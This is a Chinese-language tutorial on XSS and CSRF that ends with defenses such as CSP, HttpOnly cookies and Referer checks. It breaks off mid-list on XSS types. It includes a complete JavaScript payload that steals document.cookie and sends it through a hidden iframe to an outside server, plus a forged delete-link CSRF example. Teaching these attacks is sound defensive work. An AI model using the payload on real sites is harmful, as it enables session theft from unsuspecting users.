xss--跨站脚本攻击

通过客户端脚本语言（最常见如：JavaScript）
在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS！

csrf也叫xsrf ---跨站请求伪造

又称XSRF，冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）

通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。
XSS更偏向于代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。

场景：我在一条帖子里面写下了如下代码，发了出去，然后陆陆续续有很多可爱（wu / zhi） 的用户访问到这个帖子，然后用户接下来的所有操作都由我这串代码掌控了（各种姿势混着玩~）

如下：

```
while(true){
    alert('你关不掉我');
}
```

这个就是最原始的脚本注入了。
用户进来就麻烦了，一直弹窗一直弹窗。

那么XSS（跨站脚本）就是照瓢画葫了，用JavaScript写一个请求跨站的脚本就是XSS了，如下：

```
// 用 <script type="text/javascript"></script> 包起来放在评论中
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
```

此段代码携带着cookie信息传输给了 **[http://192.168.123.123/myxss/...](http://192.168.123.123/myxss//strong) 这段服务器，然后服务器的代码就可以接收到了用户的隐私消息，继而继续做其他的业务处理（myxss/index.php 中写一些可怕的代码，如把用户信息存进自己的数据库）。**

*有没感觉到背后一寒*

看到这里感觉到危险了吧（想想初学程序时我们的站点完全没有这个意识，活生生的是在裸奔），=
既然此段脚本注入能携带着用户信息到收集服务器，那么再研究研究，他自然能发邮件？发帖？一系列业务逻辑？ ~~当然可以！。

这里tips一下：上面的代码仅仅是XSS，并没有发生CSRF，因为192.168.123.123/myxss/index.php 仅仅是把用户信息存起来了而已，他并没有“伪造”用户发起一些请求，所以他只算是XSS攻击而不算是CSRF攻击，如果192.168.123.123/myxss/index.php 写的代码是 将当前用户的昵称改为“我是大笨猪”，那么就算是CSRF攻击了，因为这段代码伪造用户发出了请求（但是用户却不自知）。

那么下面我介绍一下最最简单的CSRF攻击（没有用到XSS的哦）：
一个论坛，经过我的多次抓包分析（着重分析请求返回头，请求返回体）了解到这个论坛的删帖操作是触发 csdnblog.com/bbs/delete_article.php?id=“X" 那么，我只需要在论坛中发一帖，包含一链接：www.csdnblog.com/bbs/delete_article.php?id=“X" ，只要有用户点击了这个链接，那么ID为X的这一篇文章就被删掉了，而且是用户完全不知情的情况（敲黑板状：此处我可没有写XSS脚本哦，我纯粹是发一个url地址出来而已，既然删除操作可以伪造，那么只要我细细分析，其他操作（发帖，改名字，发私信，只要是这个论坛具有的功能）我都可以伪造咯！

XSS与CSRF讲完了，回头我会讲下如何防范XSS与CSRF。



如何防止xss和csrf攻击

CSRF依赖于XSS，防住XSS基本也就防住了CSRF让我们明确我们的目的，其实就是不让用户踏入XSS的坑，那我们有两个方法防止用户入坑，一个是对外部输入进行彻彻底底的敏感字符过滤，一个是在显示的时候做一些特殊处理不让敏感代码顺利执行。

```
其它的通用的补充性防御手段

1.在输出html时，加上Content Security Policy的Http Header
（作用：可以防止页面被XSS攻击时，嵌入第三方的脚本文件等）
（缺陷：IE或低版本的浏览器可能不支持）
2.在设置Cookie时，加上HttpOnly参数
（作用：可以防止页面被XSS攻击时，Cookie信息被盗取，可兼容至IE6）
（缺陷：网站本身的JS代码也无法操作Cookie，而且作用有限，只能保证Cookie的安全）
3.在开发API时，检验请求的Referer参数
（作用：可以在一定程度上防止CSRF攻击）
（缺陷：IE或低版本的浏览器中，Referer参数可以被伪造）
```







































## XSS

跨站脚本攻击

攻击者在网站中注入恶意的客户端代码，通过恶意脚本对客户端页面进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户的隐私数据

XSS攻击可以分为3类：反射型，存储型，基于DOM型

1.反射性(非持久性)

